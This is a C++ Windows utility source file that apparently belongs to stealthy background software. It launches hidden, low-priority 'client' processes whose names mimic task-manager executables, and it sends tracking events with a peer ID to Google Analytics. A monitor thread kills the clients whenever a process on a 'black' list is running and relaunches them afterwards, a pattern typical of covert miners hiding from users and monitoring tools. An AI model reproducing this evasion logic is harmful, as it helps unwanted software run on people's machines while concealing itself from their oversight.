#include "stdafx.h"
#include "Util.h"
#include "Utility/PeeIdHelper.h"
#include <Urlmon.h>
#pragma comment(lib, "Urlmon.lib")
#include <Tlhelp32.h>
#include <cstddef>
#include <cwctype>
#include "ProcList.h"
#include "CheckEnvironment.h"
#include "Utility/StringOperation.h"

wchar_t *szClientList[] = { L"taskmszn.exe", L"taskmsza.exe", L"taskmsxc.exe"};

DWORD WINAPI SendHttpStatThread(LPVOID pParameter)
{
	TSAUTO();
	TCHAR szUrl[MAX_PATH] = {0};
	_tcscpy(szUrl,(TCHAR*)pParameter);
	delete [] pParameter;

	TCHAR szBuffer[MAX_PATH] = {0};
	::CoInitialize(NULL);
	HRESULT hr = ::URLDownloadToCacheFile(NULL, szUrl, szBuffer, MAX_PATH, 0, NULL);
	TSDEBUG4CXX(L"SendHttpStatThread hr = "<<hr);
	::CoUninitialize();
	return SUCCEEDED(hr)?ERROR_SUCCESS:0xFF;
}

HANDLE SendAnyHttpStat(TCHAR *ec,TCHAR *ea, TCHAR *el,long ev)
{
	TSAUTO();
	if (ec == NULL || ea == NULL)
	{
		return NULL;
	}
	TCHAR* szURL = new TCHAR[MAX_PATH];
	ZeroMemory(szURL, sizeof(TCHAR)*MAX_PATH);

	std::wstring wstrPeerID;
	GetPeerId_(wstrPeerID);
	std::wstring strMore = L"";
	if (el != NULL )
	{
		strMore += L"&el=";
		strMore += el;
	}
	if (ev != 0)
	{
		TCHAR szTmp[MAX_PATH] = {0};
		_stprintf(szTmp, L"&ev=%ld",ev);
		strMore += szTmp;
	}
	_stprintf(szURL, L"http://www.google-analytics.com/collect?v=1&tid=UA-106053045-1&cid=%s&t=event&ec=%s&ea=%s%s",wstrPeerID.c_str(),ec,ea,strMore.c_str());
	TSDEBUG4CXX(L"SendAnyHttpStat szURL = "<<szURL);
	DWORD dwThreadId = 0;
	HANDLE hThread = CreateThread(NULL, 0, SendHttpStatThread, (LPVOID)szURL,0, &dwThreadId);
	return hThread;
	//CloseHandle(hThread);
}

bool IsContainFileName(const wchar_t* szFileName ,const wchar_t* szFindName)
{
	std::wstring wstrFileName = ultra::ToLower(szFileName);
	if (wstrFileName.find(szFindName) != std::wstring::npos)
	{
		return true;
	}
	return false;
}

void TerminateAllClientInstance()
{
	HANDLE hSnap = ::CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	if (hSnap != INVALID_HANDLE_VALUE)
	{
		PROCESSENTRY32 pe;
		pe.dwSize = sizeof(PROCESSENTRY32);
		BOOL bResult = ::Process32First(hSnap, &pe);
		while (bResult)
		{
			for (int i = 0; i < ARRAYSIZE(szClientList); i++)
			{
				if (IsContainFileName(pe.szExeFile, szClientList[i]))
				{
					HANDLE hProcess = ::OpenProcess(PROCESS_TERMINATE, FALSE, pe.th32ProcessID);
					::TerminateProcess(hProcess, 99);
				}
			}
			bResult = ::Process32Next(hSnap, &pe);
		}
		::CloseHandle(hSnap);
	}
}

BOOL CreateClientProcess(const std::wstring &wstrCmd)
{
	STARTUPINFO si;
	PROCESS_INFORMATION pi;
	ZeroMemory(&si, sizeof(STARTUPINFO));  
	si.cb = sizeof(STARTUPINFO);  
	si.dwFlags = STARTF_USESHOWWINDOW | STARTF_USESTDHANDLES;  //允许设置showwindow和设置新进程的输入输出句柄参数  
	si.hStdOutput = NULL;     //意思是：子进程的stdout输出到m_hStdOutWrite    
	si.hStdError = NULL;      //意思是：子进程的stderr输出到m_hStdOutWrite    
	si.hStdInput = NULL;  
	si.wShowWindow = SW_HIDE;
	::SetErrorMode(::SetErrorMode(0)|SEM_FAILCRITICALERRORS|SEM_NOOPENFILEERRORBOX|SEM_NOGPFAULTERRORBOX|SEM_NOALIGNMENTFAULTEXCEPT);
	if(!CreateProcess( NULL,(LPTSTR)wstrCmd.c_str(), NULL, NULL, TRUE, NULL, NULL, NULL,&si,	&pi ))
	{
		TSDEBUG4CXX(L"launch client  failed, last error = "<< GetLastError()); 
		return FALSE;
	}
	SetPriorityClass(pi.hProcess,BELOW_NORMAL_PRIORITY_CLASS);
	CloseHandle(pi.hProcess);
	CloseHandle(pi.hThread);
	TSDEBUG4CXX(L"launch client success");
	return TRUE;
}

BOOL IsBlackProcessExist()
{
	HANDLE hSnap = ::CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	if (hSnap != INVALID_HANDLE_VALUE)
	{
		PROCESSENTRY32 pe;
		pe.dwSize = sizeof(PROCESSENTRY32);
		BOOL bResult = ::Process32First(hSnap, &pe);
		while (bResult)
		{
			for (int i = 0; i < ARRAYSIZE(szBlackProcList); i++)
			{
				if (IsContainFileName(pe.szExeFile, szBlackProcList[i]))
				{
					return TRUE;
				}
			}
			bResult = ::Process32Next(hSnap, &pe);
		}
		::CloseHandle(hSnap);
	}
	return FALSE;
}

BOOL IsClientRunning(const std::wstring &wstrName)
{
	HANDLE hSnap = ::CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	if (hSnap != INVALID_HANDLE_VALUE)
	{
		PROCESSENTRY32 pe;
		pe.dwSize = sizeof(PROCESSENTRY32);
		BOOL bResult = ::Process32First(hSnap, &pe);
		while (bResult)
		{
			if (IsContainFileName(pe.szExeFile, wstrName.c_str()))
			{
				return TRUE;
			}
			bResult = ::Process32Next(hSnap, &pe);
		}
		::CloseHandle(hSnap);
	}
	return FALSE;
}

DWORD WINAPI MonitorProcessThread(LPVOID pParameter)
{
	TSAUTO();	
	do 
	{
		DWORD dwSleepTime = 2*1000;
		if (IsBlackProcessExist())
		{
			TerminateAllClientInstance();
			dwSleepTime = 3*60*1000;
		}
		else
		{
			if (!RunEnvironment::Instance()->StartAllClient(false))
			{
				TerminateAllClientInstance();
				break;
			}
			dwSleepTime = 10*1000;
		}
		Sleep(dwSleepTime);
	} while (TRUE);
	return 0;
}